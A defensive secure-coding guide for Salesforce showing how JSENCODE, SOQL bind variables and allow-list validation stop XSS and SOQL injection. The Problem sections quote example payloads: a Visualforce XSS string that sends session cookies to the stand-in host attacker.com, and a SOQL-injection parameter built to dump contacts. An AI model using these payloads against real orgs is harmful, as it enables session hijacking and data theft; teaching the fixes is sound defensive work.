# Examples — XSS and Injection Prevention

The Example 2 attack string is illustrative; the guide's own SOQL-injection walk-through is apexdev 264 L13628-13657.

## Example 1: JSENCODE Missing in Visualforce JavaScript Block

**Context:** A Visualforce page displays an Account record and passes the Account Name to a JavaScript function for a third-party analytics integration. The page has been working fine for standard account names but a security review flagged it.

**Problem:** The page uses `{!account.Name}` directly inside a `<script>` block. An attacker who can edit the Account Name (or injects data via an API) can store a value like `'; document.location='https://attacker.com?c='+document.cookie+'` to steal session cookies.

**Solution:**
```html
<!-- BEFORE: vulnerable -->
<script>
    var acctName = '{!account.Name}';
    thirdPartyAnalytics.track(acctName);
</script>

<!-- AFTER: safe -->
<script>
    var acctName = '{!JSENCODE(account.Name)}';
    thirdPartyAnalytics.track(acctName);
</script>
```

**Why it works:** `JSENCODE()` inserts escape characters "such as a backslash (\), before unsafe JavaScript characters, such as the apostrophe" (apexdev 264 L13506-13507). The attacker's injected single quote is encoded to `\'`, breaking the escape attempt.

---

## Example 2: SOQL Injection in a Search Endpoint

**Context:** An Apex REST endpoint exposes a contact search feature used by an Experience Cloud site. The endpoint accepts a `lastName` query parameter and returns matching contacts.

**Problem:** The original implementation concatenates the parameter directly into a SOQL string. An attacker sends `lastName=Smith' OR Id != null AND (SELECT Id FROM User WHERE Profile.Name = 'System Administrator') != null AND LastName != '` to extract all contacts in the org.

**Solution:**
```apex
// BEFORE: vulnerable
@RestResource(urlMapping='/contacts/search')
global class ContactSearchEndpoint {
    @HttpGet
    global static List<Contact> search() {
        String lastName = RestContext.request.params.get('lastName');
        // VULNERABLE: direct string concatenation
        return Database.query(
            'SELECT Id, Name, Email FROM Contact WHERE LastName = \'' + lastName + '\''
        );
    }
}

// AFTER: safe using bind variable
@RestResource(urlMapping='/contacts/search')
global class ContactSearchEndpoint {
    @HttpGet
    global static List<Contact> search() {
        String lastName = RestContext.request.params.get('lastName');
        // SAFE: bind variable
        return Database.query(
            'SELECT Id, Name, Email FROM Contact WHERE LastName = :lastName'
        );
    }
}
```

**Why it works:** The bind variable `:lastName` tells the Salesforce query engine to treat the value as a string literal, regardless of what characters it contains. No amount of SQL syntax in the parameter value can modify the query structure.

---

## Anti-Pattern: Trusting escapeSingleQuotes() as Sole Protection

**What practitioners do:** Use `String.escapeSingleQuotes(userInput)` and consider the dynamic SOQL safe:

```apex
// WRONG: escapeSingleQuotes as sole protection
String safe = String.escapeSingleQuotes(userInput);
Database.query('SELECT Id FROM Account WHERE Name = \'' + safe + '\'');
```

**What goes wrong:** `String.escapeSingleQuotes()` escapes single quotation marks and backslashes only (apexref 262 L235380). It is the guide's named defense for dynamic SOQL and SOSL (apexdev 264 L11679, L11763), but the guide prefers a static query with a bind variable (L13661-13662), and escaping does nothing for injection in `ORDER BY` / `LIMIT` clauses or field names, where the input is not inside a quoted literal. UNVERIFIED (2026-10-20): Unicode-lookalike and multi-byte encoding attacks on `escapeSingleQuotes` are not discussed in the corpus.

**Correct approach:** Use bind variables as the primary defense. If dynamic field names, object names, or operators must be constructed (where bind variables cannot be used), validate them against a whitelist of known-safe values before including them in the query string.
